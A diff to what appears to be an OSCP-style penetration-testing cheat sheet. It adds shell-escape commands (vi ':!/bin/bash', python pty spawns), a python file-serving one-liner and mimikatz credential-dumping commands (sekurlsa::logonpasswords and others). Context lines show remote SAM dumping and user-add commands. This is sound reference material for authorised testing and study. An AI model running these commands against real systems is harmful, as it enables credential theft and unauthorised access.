@@ -4,6 +4,7 @@
 # / /___  / / / /|_____/ ___/ (_| \__ \ ||  __/ (_| | |_) | |  __/\__ \
 # \____/  \/  \/       \/    \__,_|___/\__\___|\__,_|_.__/|_|\___||___/
 
+Version 9 08/12/2022
 Version 8 10/16/2019
 Version 7 5/18/2018
 Version 6 12/27/2017
@@ -14,6 +15,7 @@ Version 2 09/9/2016
 
 Created by jfer (jfer@compsecdirect.com) @jfersec #jfersec
 Change Log:
+Version 9: Edits and new techniques
 Version 8: Open-Source Version
 Version 7: OSCP exam edits
 Version 6: OSCP edits
@@ -205,8 +207,12 @@ Jail breaks, escapes
 ===========================================================
 
 *vi*
+:!/bin/bash
 :python3 import pty; pty.spawn('/bin/bash')
+
+*python*
 python -c "import pty; pty.spawn('/bin/bash')"
+
 :!/bin/sh
 
 *declare*
@@ -215,6 +221,8 @@ export PATH=/bin/sh;or /usr/bin or /flag
 
 *lshell*
 echo os.system('/bin/bash')
+
+
 
 ===========================================================
 Obfuscation
@@ -231,6 +239,7 @@ scp -i netwars.priv -P 62201 user@netwars-ng.counterhack.com:/home/user/backup.7
 scp -P 7777 wce.exe j0hn@127.0.0.1:/home/j0hn
 
 -python webserver-
+python3 -m http.server 80
 python -m SimpleHTTPServer 80
 
 *dev tcp*
@@ -313,15 +322,7 @@ NET LOCALGROUP "Remote Desktop Users" bobo /ADD
 ===========================================================
 Implants
 ===========================================================
-*mimikatz*
-privilege::debug
-log mk.log
-sekurlsa::logonpasswords
-sekurlsa::ekeys
-sekurlsa::kerberos
-python -c "import pty; pty.spawn('/bin/bash')"
 
-*pwdump7*
 
 ===========================================================
 Enumeration
@@ -386,10 +387,17 @@ Creds
 *Remote SAM*
 ./samrdump.py administrator:abc123@DST_IP
 
-*mimikatz*
+*mimikatz in MSF*
 migrate to 64bit process
 load mimikatz
 wdigest
+
+*mimikatz manual*
+privilege::debug
+log mk.log
+sekurlsa::logonpasswords
+sekurlsa::ekeys
+sekurlsa::kerberos
 
 *samdump2*
 -xp-
@@ -410,6 +418,8 @@ Keylogging
 ===========================================================
 Mail
 ===========================================================
+*powershell*
+Check ipme in https://github.com/compsecdirect/ipme/raw/master/ipme.ps1
 
 ===========================================================
 Loops
@@ -504,7 +514,6 @@ sessions -C "run multi_console_command -r auto-post.rc"
 set AutoRunScript multi_console_command -rc auto-post.txt
 
 
-*
 
 
 ===========================================================
